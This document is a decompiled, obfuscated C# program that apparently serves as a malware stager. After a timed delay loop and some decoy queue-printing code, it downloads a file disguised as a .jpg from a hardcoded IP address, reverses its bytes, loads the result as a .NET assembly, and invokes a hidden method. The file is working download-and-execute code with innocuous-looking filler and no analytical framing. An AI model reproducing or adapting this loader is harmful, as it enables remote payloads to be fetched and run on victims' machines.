using System;
using System.Collections;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;

internal sealed class Class0
{
	private static bool bool_0;

	private static object object_0;

	[STAThread]
	private static void Main()
	{
		Timer timer = new Timer(smethod_0, null, 20000, 20000);
		while (!bool_0)
		{
			Console.WriteLine(DateTime.Now);
		}
		timer.Dispose();
		smethod_2();
	}

	private static void smethod_0(object object_1)
	{
		bool_0 = true;
	}

	private static object smethod_1()
	{
		Assembly assembly = object_0 as Assembly;
		return assembly.GetType("Chfclcesagyiajarblkxzx.Zhedaqmrabissyrrdzzldpga");
	}

	private static void smethod_2()
	{
		object_0 = Assembly.Load(smethod_3());
		Type type = smethod_1() as Type;
		Queue queue = new Queue();
		queue.Enqueue(10);
		queue.Enqueue("hi");
		string obj = (string)type.GetMethod("Cyqxtjytoxrynbegcqsiokmj")!.Invoke(null, null);
		queue.Enqueue(obj);
		queue.Enqueue(3.14f);
		queue.Enqueue(true);
		queue.Enqueue(67.8);
		queue.Enqueue('A');
		foreach (object item in queue)
		{
			Console.Write(item?.ToString() + " ");
		}
		Console.WriteLine();
		Console.WriteLine(queue.Count);
		Console.WriteLine();
		Console.WriteLine(string.Format("{0}", queue.Contains("hi")));
		Console.WriteLine();
		queue.Clear();
		Console.WriteLine($"{queue.Count}");
	}

	private static byte[] smethod_3()
	{
		try
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		}
		catch
		{
		}
		byte[] array = new BinaryReader(WebRequest.Create("http://91.243.44.142/arx-Kbcmvm_Rrkpioky.jpg").GetResponse().GetResponseStream()).ReadBytes(81159019);
		Array.Reverse((Array)array, 0, array.Length);
		return array;
	}
}
